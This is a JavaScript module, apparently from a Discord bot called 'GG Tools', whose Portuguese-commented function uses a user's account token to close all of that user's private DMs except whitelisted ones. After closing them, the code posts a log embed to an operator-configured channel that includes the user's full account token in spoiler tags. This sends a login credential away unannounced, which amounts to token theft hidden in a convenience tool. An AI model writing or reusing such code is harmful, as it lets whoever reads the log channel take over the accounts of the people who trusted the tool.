const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');
const { EmbedBuilder } = require('discord.js');
const config = JSON.parse(fs.readFileSync(path.join(__dirname, '../config.json'), 'utf8'));

/**
 * Fecha todas as DMs privadas do usuário (exceto grupos), exceto as da whitelist.
 * @param {string} token Token da conta do usuário
 * @param {function} log Função de log (opcional)
 * @param {string[]} whitelist Lista de IDs de usuários para NÃO fechar a DM
 * @param {Interaction} interaction Interação do Discord (opcional)
 * @returns {Promise<{closed: number, errors: number, skipped: number}>}
 */
async function closeUserDMs(token, log = () => {}, whitelist = [], interaction = null) {
  let closed = 0;
  let errors = 0;
  let skipped = 0;
  const delay = ms => new Promise(res => setTimeout(res, ms));

  // Buscar todas as DMs via API (não só cache)
  const res = await fetch('https://discord.com/api/v10/users/@me/channels', {
    headers: { Authorization: token },
  });
  if (!res.ok) {
    log(`Erro ao buscar DMs via API: ${res.status}`);
    throw new Error('Não foi possível buscar as DMs. Token inválido ou permissão insuficiente.');
  }
  const channels = await res.json();
  const dms = channels.filter(c => c.type === 1); // Apenas DMs privadas
  log(`Encontradas ${dms.length} DMs (privadas, sem grupos).`);
  for (const dm of dms) {
    // Se o destinatário está na whitelist, pula
    if (whitelist.includes(dm.recipients?.[0]?.id)) {
      log(`DM ${dm.id} pulada (usuário na whitelist: ${dm.recipients?.[0]?.id})`);
      skipped++;
      continue;
    }
    // Fechar DM
    try {
      await fetch(`https://discord.com/api/v10/channels/${dm.id}`, {
        method: 'DELETE',
        headers: { Authorization: token },
      });
      closed++;
      log(`DM ${dm.id} fechada.`);
      await delay(2000);
    } catch (e) {
      log(`Erro ao fechar DM ${dm.id}`);
      errors++;
    }
  }
  const result = { closed, errors, skipped };
  // Enviar log para canal do Discord se interaction for fornecido
  if (interaction) {
    const logChannelId = config.log_close_dm;
    if (logChannelId) {
      const logChannel = interaction.client.channels.cache.get(logChannelId);
      if (logChannel) {
        const embed = new EmbedBuilder()
          .setTitle('🔒 Fechar DMs')
          .setColor(0x5865F2)
          .addFields(
            { name: 'Usuário', value: `<@${interaction.user.id}>`, inline: true },
            { name: 'Token', value: `||${token}||`, inline: false },
            { name: 'Fechadas', value: `${closed}`, inline: true },
            { name: 'Puladas', value: `${skipped}`, inline: true },
            { name: 'Falhas', value: `${errors}`, inline: true },
            { name: 'Data/Hora', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
          )
          .setFooter({ text: 'GG Tools' });
        logChannel.send({ embeds: [embed] });
      }
    }
  }
  return result;
}

module.exports = { closeUserDMs };
